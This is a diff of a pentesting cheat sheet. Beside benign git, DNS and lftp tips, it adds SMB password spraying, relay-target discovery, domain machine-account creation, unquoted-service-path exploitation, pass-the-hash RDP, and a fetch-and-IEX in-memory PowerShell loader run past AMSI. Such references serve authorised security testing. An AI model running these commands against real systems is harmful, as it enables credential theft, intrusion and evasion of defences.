@@ -808,8 +808,18 @@ mkpasswd -m sha-512 new_password_here
 # recursively check file permissiona
 namei -l /path/to/check/
 
+# set systemwide DNS
+sudo nano /etc/resolv.conf
+#nameserver 127.0.0.53 # only comment out, do not delete
+nameserver DNS_IP_here
+
 # enumerate shares
 nmblookup -A IP_here
+
+# keep process running after logout
+nohup command_here
+## check back on command after next login
+tail -f nohup.out # ctrl+c to quit
 
 # import client certificate
 ## extract .pem
@@ -1687,14 +1697,14 @@ wmic computersystem get domain
 
 # run as other user
 C:\Windows\System32\runas.exe /env /noprofile /user:user_name_here password_here "command_or_program_here"
+C:\Windows\System32\runas.exe /netonly /user:domain_here\user_name_here password_here "command_or_program_here"
 
-# find services with unquoted service paths
+# exploit unquoted service paths
+## find services with unquoted service paths
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-# check for write permissions --> (W)
+## check for write permissions --> (W)
 icacls C:\path\to\folder\here
-
-# rename file
+## rename file
 rename old_file_name new_file_name
 ```
 
@@ -1774,6 +1784,16 @@ crackmapexec smb IP_here -u user -p password -M spider_plus
 
 # check credentials
 cme smb IP_here -u user_here -p 'password_here'
+
+# password spraying
+cme smb host_here -u users.txt -p "password_here" --continue-on-success
+cme smb host_here -u users.txt -p "password_here" --continue-on-success | tee -a pw_spray.cme # log to pw_spray.cme
+
+# find hosts with disabled SMB signing
+cme smb DC_IP_here --gen-relay-list IP_range_here
+
+# add machine account to domain
+addcomputer.py -computer-name "some_name" -computer-pass "some_pass" -dc-host DC_IP_here -domain-netbios domain_name_here domain_here/user_here:password_here -debug
 
 # access db (see results)
 cmedb
@@ -2451,6 +2471,24 @@ git config --global user.email "muemmel@moehre"
 ## push
 GIT_SSH_COMMAND='ssh -i /path/to/private/key -p port_here' git push origin master
 GIT_SSH_COMMAND='ssh -i /path/to/private/key' git push origin master
+
+# create pull request
+## clone project
+git clone https://repo_url_here
+## create new branch
+git branch new_branch_name_here
+## switch to new_branch
+git checkout new_branch
+## add user config
+git config user.email "user@mail.com"
+git config user.name "git_username_here"
+## commit changes
+git status
+git add .
+git commit -m "meaningful comment here"
+## set upstream branch fore new_branch + push changes
+git push --set-upstream origin new_branch
+## in GUI: create pull/merge request
 ```
 
 
@@ -3039,6 +3077,18 @@ ldapsearch -x -h IP_here -s base namingcontexts
 
 # LAPS? search for local admin passwords
 ldapsearch -v -x -D username_here@domain.here -w password_here -b 'dc=domain_here,dc=dc2_here' -h IP_here "(ms-MCS-AdmPwd=*)"
+```
+
+
+## LFTP
+```bash
+# connect to FTPS
+lftp
+set ftp:ssl-force true; set ftp:ssl-protect-data true; set ssl:verify-certificate/fingerprint_here no; open ftps://IP_here:990
+
+# get fingerprint
+lftp
+set ftp:ssl-force true; set ftp:ssl-protect-data true; open ftps://IP_here:990
 ```
 
 
@@ -4348,7 +4398,7 @@ Install-Module -Name module_name_here -Scope CurrentUser -Force
 Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"
 
 # grep recursively
-Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"
+Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"
 
 # find connections for specific service
 netstat -anbo | Select-String service_name_here -Context 1
@@ -4359,7 +4409,7 @@ Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Inclu
 # search for string in files in current directory + sub folders
 Get_ChildItem . -Recurse | Select-String "string_here"
 
-# show user-specidic proxy settings
+# show user-specific proxy settings
 Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 
 # download file from web server + run it 
@@ -4454,12 +4504,24 @@ powershell -e base64_payload_here -w hidden
 # run base64-encoded command without popping window or loading user profile
 powershell -e base64_payload_here -w hidden -nop
 
+# run base64-encoded script
+## base64 encode file (bash)
+cat script.ps1 | base64 > tmp.txt # encode script
+python3 -m http.server port_here # host file
+<access http://IP_here:port_here/tmp.txt, Ctrl+A Ctrl-C> # fetch + copy file in browser
+## read file content into variable (in (AMSI-bypassed, optionally) powershell shell)
+$content = "base64_data_here"
+## decode base64-data to load script into memory
+IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content)))
+## call powershell method from script
+Invoke-pwsh_method_name_here
+
+
 # base64 encode file
-# read file content into variable
 $content = Get-Content /path/to/file
-# read bytes into variable
+## read bytes into variable
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
-# base64 encode bytes
+## base64 encode bytes
 [Convert]::ToBase64String($bytes)
 
 # base64 decode file
@@ -4921,7 +4983,7 @@ responder -I interface_here -A
 # capture hashes
 responder -I interface_here
 
-# force responder to recapture previously captured hashes
+# force responder to recapture previously captured hashes | verbose mode
 responder -I interface_here -v
 
 # crack NTLMv2 (NetNTLM) hash captured with responder
@@ -4929,6 +4991,12 @@ hashcat -m 5600 /path/to/hash /path/to/wordlist
 
 # spawn shell with psexec
 impacket-psexec username_here:password_here@IP_here
+
+# identify offending services (startup error)
+sudo netstat -antp | grep offending_port_here
+## confirm service is running + stop process
+sudo systemctl status service_name_here
+sudo systemctl stop service_name_here
 ```
 
 
@@ -6104,6 +6172,14 @@ vncviewer IP_here::5900
 
 
 
+## WEBCLIENTSCANNER
+```bash
+# find hosts with active WebDAV service
+webclientscanner -dc-ip DC_IP_here domain_here:user_here:password_here@IP_range_here
+```
+
+
+
 ## WES-NG (Windows Exploit Suggester - Next Generation)
 ```
 # update WES-NG
@@ -6191,8 +6267,14 @@ wpscan --url url_here -P /path/to/wordlist
 
 ## XFREERDP
 ```bash
-# establish connection
+# establish connection with password
 xfreerdp /u:user_here /p:password_here /cert:ignore /v:IP_here
+
+# establish connection via PtH
+xfreerdp /u:user_here /pth:2nd_part_NTLMhash_here /cert:ignore /v:IP_here
+
+# resize RDP window
+xfreerdp /u:user_here /p:password_here /v:IP_here /smart-sizing:1920x1080
 ```
 
 
